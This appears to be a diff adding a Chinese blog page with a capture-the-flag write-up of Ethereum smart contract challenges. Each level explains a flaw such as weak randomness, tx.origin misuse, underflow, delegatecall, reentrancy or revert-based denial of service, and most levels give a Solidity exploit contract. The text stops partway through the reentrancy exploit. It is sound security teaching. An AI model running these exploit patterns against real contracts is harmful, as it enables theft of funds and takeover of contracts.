@@ -1,0 +1,1412 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avater.png">
+  <link rel="icon" href="/img/avater.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Etherenum-Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Etherenum-WriteUp">
+<meta property="og:url" content="http://example.com/2024/01/31/Etherenum-WriteUp/index.html">
+<meta property="og:site_name" content="Xux&#39;s Blog">
+<meta property="og:description" content="Etherenum-Writeup">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312050028994.png">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312121419125.jpg">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312050029311.png">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312050029514.png">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312051628226.png">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312051628903.png">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221326816.png">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325890.png">
+<meta property="og:image" content="http://example.com/assets/image-20231213114812287.png">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325982.png">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325618.png">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325489.png">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325886.png">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325329.png">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325936.png">
+<meta property="og:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325272.png">
+<meta property="og:image" content="http://example.com/assets/image-20231225170807909.png">
+<meta property="og:image" content="http://example.com/assets/image-20231225171055484.png">
+<meta property="og:image" content="http://example.com/assets/image-20231227110404735.png">
+<meta property="article:published_time" content="2024-01-31T04:29:32.000Z">
+<meta property="article:modified_time" content="2024-01-31T04:51:04.626Z">
+<meta property="article:tag" content="Etherenum">
+<meta property="article:tag" content="BlockChain Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312050028994.png">
+  
+  
+  
+  <title>Etherenum-WriteUp - Xux&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/selection.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"chbeNMVzNkGT8To7z3Vxgjyt-gzGzoHsz","app_key":"7SNnd3u49QeFlAxAfTMeoR8p","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xux&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Etherenum-WriteUp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-31 12:29" pubdate>
+          2024年1月31日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          61 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Etherenum-WriteUp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Etherenum-Writeup</p>
+<span id="more"></span>
+
+<h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><blockquote>
+<p>This is a coin flipping game where you need to build up your winning  streak by guessing the outcome of a coin flip. To complete this level  you’ll need to use your psychic abilities to guess the correct outcome  10 times in a row.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity  ^0.8.4;<br><br>contract CoinFlip &#123;<br><br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor() &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以注意到最后生成的bool实际结果取决于block.number</p>
+<p>而block.number为当前整个以太坊网络上的区块编号，我们是可以获取的</p>
+<p>Exp: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit&#123;<br>    CoinFlip private coinflip;<br>    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br>    uint256 lastHash;<br>    constructor(address _address)&#123;<br>        coinflip = CoinFlip(_address);<br>    &#125;<br>    function hack() external &#123;<br>        uint256 blockValue = uint256(blockhash(block.number - 1));<br>        uint256 coinFlip = blockValue / FACTOR;<br>        bool side = coinFlip == 1 ? true : false;<br>        bool res = coinflip.flip(side);<br>        require(res, &#x27;guess faild&#x27;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后按10下Hack即可通关</p>
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312050028994.png" srcset="/img/loading.gif" lazyload alt="image-20231204115234737"></p>
+<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><blockquote>
+<p>Claim ownership of the contract below to complete this level.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Telephone &#123;<br><br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>  &#125;<br><br>  function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>changeOwner函数则检查tx.origin和msg.sender是否相等，如果不一样就把owner更新为传入的owner</p>
+<p>这里涉及到了tx.origin和msg.sender的区别，前者表示交易的发送者，后者则表示消息的发送者，如果情景是在一个合约下的调用，那么这两者是没有区别的，但是如果是在多个合约的情况下，比如用户通过A合约来调用B合约，那么对于B合约来说，msg.sender就代表合约A，而tx.origin就代表用户</p>
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312121419125.jpg" srcset="/img/loading.gif" lazyload alt="16450711251.jpg"></p>
+<p>Exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exp &#123;<br>    Telephone private telephone;<br>    constructor(address _address) &#123;<br>        telephone = Telephone(_address);<br>    &#125;<br>    function exp(address _owner) external &#123;<br>        telephone.changeOwner(_owner);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Token &#123;<br><br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) public &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br><br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br><br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>使用的是0.6.0之前的solidity，没有溢出检查</p>
+<p>转1个Token让他下溢即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>    Token private token;<br>    constructor(address _address)&#123;<br>        token = Token(_address);<br>    &#125;<br>    function hack(uint _value) external &#123;<br>        token.transfer(0xAE180bcc68A4A32203210DFe4fD40a11Ad5e5d27, _value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><blockquote>
+<p>The goal of this level is for you to claim ownership of the instance you are given</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Delegate &#123;<br><br>  address public owner;<br><br>  constructor(address _owner) &#123;<br>    owner = _owner;<br>  &#125;<br><br>  function pwn() public &#123;<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br><br>contract Delegation &#123;<br><br>  address public owner;<br>  Delegate delegate;<br><br>  constructor(address _delegateAddress) &#123;<br>    delegate = Delegate(_delegateAddress);<br>    owner = msg.sender;<br>  &#125;<br><br>  fallback() external &#123;<br>    (bool result,) = address(delegate).delegatecall(msg.data);<br>    if (result) &#123;<br>      this;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>当用户<code>A</code>通过合约<code>B</code>来<code>delegatecall</code>合约<code>C</code>的时候，执行的是合约<code>C</code>的函数，但是<code>语境</code>仍是合约<code>B</code>的：<code>msg.sender</code>是<code>A</code>的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约<code>B</code>的变量上</p>
+<p>也就是说通过Delegation去delegatecall执行Delegate的pwn方法，改变的owner是Delegation的</p>
+<p>那么只要执行Delegation的fallback就行了，众所周知随便执行一个合约不存在的方法就会调他的fallback</p>
+<p>Exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit&#123;<br>    function pwn() public &#123;<br>       0x9f6b08E407C0802278efFd39BAe35BE9A09a4633.call(abi.encodeWithSignature(&quot;pwn()&quot;));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>交易的时候记得把gas限制调大（不然可能无法修改地址 卡了好久T^T）</p>
+<p>但是这样是不行的</p>
+<p>因为这样的话msg.sender是我们部署的合约而不是调用者</p>
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312050029311.png" srcset="/img/loading.gif" lazyload alt="image-20231205002414234"></p>
+<p>直接把Exploit合约atAddress到Delegation的address</p>
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312050029514.png" srcset="/img/loading.gif" lazyload alt="image-20231205002517108"></p>
+<p>然后执行他的pwn方法，这其实就等价于执行了对应地址上Delegation合约的pwn方法</p>
+<h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><blockquote>
+<p>Some contracts will simply not take your money <code>¯\_(ツ)_/¯</code></p>
+<p>The goal of this level is to make the balance of the contract greater than zero.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Force &#123;/*<br><br>                   MEOW ?<br>         /\_/\   /<br>    ____/ o o \<br>  /~____  =ø= /<br> (______)__m_m)<br><br>*/&#125;<br></code></pre></td></tr></table></figure>
+
+<p>直接用selfdestruct在销毁部署合约的同时给Force合约转账就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>    constructor() payable &#123;&#125;<br>    function pwn(address payable _address) public payable  &#123;<br>        selfdestruct(_address);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><blockquote>
+<p>Unlock the vault to pass the level!</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Vault &#123;<br>  bool public locked;<br>  bytes32 private password;<br><br>  constructor(bytes32 _password) &#123;<br>    locked = true;<br>    password = _password;<br>  &#125;<br><br>  function unlock(bytes32 _password) public &#123;<br>    if (password == _password) &#123;<br>      locked = false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这是一个部署在区块链上的智能合约，而区块链上的所有信息都是公开的</p>
+<p>private仅为不能从外部合约访问变量的值</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">await web3<span class="hljs-selector-class">.eth</span><span class="hljs-selector-class">.getStorageAt</span>(instance, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<p>得到密码<code>A very strong secret password :)</code></p>
+<p>然后直接用密码unlock就能通关</p>
+<h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><blockquote>
+<p>The contract  below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an  event, the overthrown king gets paid the new prize, making a bit of  ether in the process! As ponzi as it gets xD</p>
+<p>Such a fun game. Your goal is to break it.</p>
+<p>When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self  proclamation.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract King &#123;<br><br>  address king;<br>  uint public prize;<br>  address public owner;<br><br>  constructor() payable &#123;<br>    owner = msg.sender;  <br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt;= prize || msg.sender == owner);<br>    payable(king).transfer(msg.value);<br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  function _king() public view returns (address) &#123;<br>    return king;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>庞氏骗局，向合约转钱的时候会把你转给合约的钱转给上一个向合约转钱的人</p>
+<p>目标是让自己一直成为king</p>
+<p>那只要自己部署的合约在接受转账的时候报错就行了，当 <code>transfer()</code> 调用失败时会回滚状态，那么如果合约在退钱这一步骤一直调用失败的话，代码将无法继续向下运行，其他人就无法成为新的 King</p>
+<p>Exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>  function pwn(address payable _address) payable external  &#123;<br>     _address.call&#123;value: msg.value&#125;(&quot;&quot;);<br>  &#125;<br>  receive() external payable &#123;<br>    revert();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><blockquote>
+<p>The goal of this level is for you to steal all the funds from the contract.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.12;<br><br>import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;<br><br>contract Reentrance &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public balances;<br><br>  function donate(address _to) public payable &#123;<br>    balances[_to] = balances[_to].add(msg.value);<br>  &#125;<br><br>  function balanceOf(address _who) public view returns (uint balance) &#123;<br>    return balances[_who];<br>  &#125;<br><br>  function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>重入攻击</p>
+<p>在攻击者构造的合约的receive函数种递归调用Reentrance合约的withdraw，可以在<code>balances[msg.sender] -= _amount</code> 之前多次转账</p>
+<p>Exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>    constructor() public payable&#123;&#125;<br>   event Log(uint balance);<br>   Reentrance private reentrance = Reentrance(0x28DfB23dfCdeF355Be69612b4c12C246292fAE9D);<br>   function pwn() external &#123;<br>    // donate<br>      payable(address(reentrance)).call&#123;value: 1000000000000000&#125;(abi.encodeWithSignature(&quot;donate(address)&quot;, address(this)));<br>      emit Log(reentrance.balanceOf(address(this)));<br>   // 